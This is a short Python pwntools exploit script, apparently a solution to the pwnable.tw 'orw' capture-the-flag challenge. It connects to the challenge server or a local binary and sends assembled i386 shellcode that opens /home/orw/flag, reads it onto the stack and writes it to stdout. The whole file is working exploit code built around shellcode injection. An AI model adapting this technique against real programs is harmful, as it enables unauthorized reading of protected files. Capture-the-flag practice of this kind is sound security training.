#!/usr/bin/env python3

from pwn import *

def start():
    global p
    if args.REMOTE:
        p = remote("chall.pwnable.tw", 10001)
    else:
        p = elf.process()

context(os="linux", arch="i386")
context.binary = elf = ELF("./orw")
start()

shellcode = shellcraft.i386.linux.open("/home/orw/flag\x00")
shellcode += shellcraft.i386.linux.read("eax", "esp", 0x30)
shellcode += shellcraft.i386.linux.write(1, "esp", 0x30)

p.recvuntil(b"Give my your shellcode:")
p.send(asm(shellcode))
print(p.recvall())
